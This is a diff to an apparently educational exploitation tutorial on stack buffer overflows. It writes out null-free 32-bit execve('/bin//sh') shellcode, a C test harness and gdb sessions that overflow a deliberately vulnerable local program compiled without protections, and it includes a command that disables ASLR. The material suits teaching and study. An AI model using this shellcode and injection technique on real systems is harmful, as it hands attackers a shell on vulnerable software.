@@ -244,3 +244,144 @@ If you try to compile and execute it, you will end up with a shellcode length of
 
 ### Clean up the assembly to make it smaller and injectable
 
+The reason that the shellcode is not injectable is that we have `push 0x68732f00`, `mov eax, 0xb` instructions. These instructions are assembled with the null bytes. So, we need to find another way to move zero and 0xb to the EAX register.
+
+1. If you need to fill the register with zero value just don't do `mov` instruction and do `xor` on the register.
+2. If you need to place a small value in the register don't use EAX name of the register using `al` which is 8 bits size or 1 byte.
+3. Replace '/bin/sh\0' string with '/bin//sh' and terminate it with null in the stack.
+
+So, clean shellcode will be the following:
+```nasm
+; nasm -f elf32 clean-low-level-shellcode.asm
+; ld -m elf_i386 clean-low-level-shellcode.o -o clean-low-level-shellcode
+
+; move in eax zero to add to the end of the string to make it null-terminated
+xor eax, eax
+; push zero to terminate the string
+push eax
+; push the string '/bin//sh'
+push 0x68732f2f
+push 0x6e69622f
+; move the first argument (/bin/sh) to ebx
+mov ebx, esp
+; push zero
+push eax
+; push the address of the string
+push ebx
+; move the second argument (argv array) to ecx
+mov ecx, esp
+; move to eax the number of the syscall
+mov al, 0xb
+; do interruption
+int 0x80
+```
+
+Disassembly:
+```bash
+clean-low-level-shellcode:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08049000 <__bss_start-0x1000>:
+ 8049000:	31 c0                	xor    eax,eax
+ 8049002:	50                   	push   eax
+ 8049003:	68 2f 2f 73 68       	push   0x68732f2f
+ 8049008:	68 2f 62 69 6e       	push   0x6e69622f
+ 804900d:	89 e3                	mov    ebx,esp
+ 804900f:	50                   	push   eax
+ 8049010:	53                   	push   ebx
+ 8049011:	89 e1                	mov    ecx,esp
+ 8049013:	b0 0b                	mov    al,0xb
+ 8049015:	cd 80                	int    0x80
+```
+
+Test the shellcode:
+```C
+#include <stdio.h>
+#include <string.h>
+
+
+unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+void main(){
+  printf("Shellcode length: %d\n", strlen(shellcode));
+  // Declare a function pointer named ret
+  // Then cast the shellcode pointer to the function pointer of the same size
+  int (*ret)() = (int(*)())shellcode;
+  // Call the function
+  ret();
+}
+```
+
+`test-dirty-shellcode` and `test-clean-shellcode` don't need to be executable, they execute with `Segmentation fault` stuff.
+
+## Exploitation
+
+We have a completed shellcode, let's use it. But first, recompile the program with the parameters: `gcc stack-overflow.c -o stack-overflow -fno-stack-protector -no-pie -z execstack -m32` to make stack executable.
+
+Crash the program and find the address of the buffer within the stack:
+```bash
+gef➤  r < <(python -c 'print "A"*262 + "B"*4')
+gef➤  x/50wx $esp - 0x14a
+0xffffce66:	0x00000804	0x85800000	0xcfa8f7fa	0x7b24ffff
+0xffffce76:	0xcea6f7fe	0xc000ffff	0x80000804	0x8000f7fa
+0xffffce86:	0xcfa8f7fa	0x923affff	0xcea60804	0xcee0ffff
+0xffffce96:	0x0003ffff	0x92240000	0xd0000804	0xe76cf7ff
+0xffffcea6:	0x6850c031	0x68732f2f	0x69622f68	0x50e3896e
+0xffffceb6:	0xb0e18953	0x4180cd0b	0x41414141	0x41414141
+0xffffcec6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffced6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcee6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcef6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcf06:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcf16:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcf26:	0x41414141	0x41414141
+gef➤  r < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xa6\xce\xff\xff"')
+Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xa6\xce\xff\xff"')
+process 8370 is executing new program: /bin/dash
+[Inferior 1 (process 8370) exited normally]
+gef➤  
+```
+
+So, my address is `0xffffcea6`. Then, I just placed the shellcode at the beginning of the buffer and jumped on it. You can see gdb said that the new program has executed.
+
+Try it outside gdb. It doesn't work. Firstly, you need to disable security technique ASLR(`echo "0"| dd of=/proc/sys/kernel/randomize_va_space`). Secondly, gdb creates its own address space and there is an offset between the address in gdb and the real address of the executable.
+
+Gdb has its env variables. So, we unset with `unset environment`. '`LINES` and `COLUMNS` vars are the lines and columns of the terminal, and GDB sets them internally'/
+
+```bash
+gef➤  unset environment LINES
+gef➤  unset environment COLUMNS
+gef➤  r < <(python -c 'print "A"*262 + "B"*4')
+gef➤  x/50wx $esp - 0x14a
+0xffffce86:	0x00000804	0x85800000	0xcfc8f7fa	0x7b24ffff
+0xffffce96:	0xcec6f7fe	0xc000ffff	0x80000804	0x8000f7fa
+0xffffcea6:	0xcfc8f7fa	0x923affff	0xcec60804	0xcf00ffff
+0xffffceb6:	0x0003ffff	0x92240000	0xd0000804	0xe76cf7ff
+0xffffcec6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffced6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcee6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcef6:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcf06:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcf16:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcf26:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcf36:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffcf46:	0x41414141	0x41414141
+gef➤  r < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xc6\xce\xff\xff"')
+Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xc6\xce\xff\xff"')
+process 8791 is executing new program: /bin/dash
+[Inferior 1 (process 8791) exited normally]
+```
+
+
+Now, outside gdb:
+```bash
+$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*239 + "\x56\xcf\xff\xff"'; cat) | ./stack-overflow
+```
+
+Sometimes `unset environment` helps, sometimes doesn't. You could try to brute-force the address with some sort of script, but there is a better solution. And that's why we need the next subsection of stack overflow vulnerability.
+
+## NOP Chain
+
+
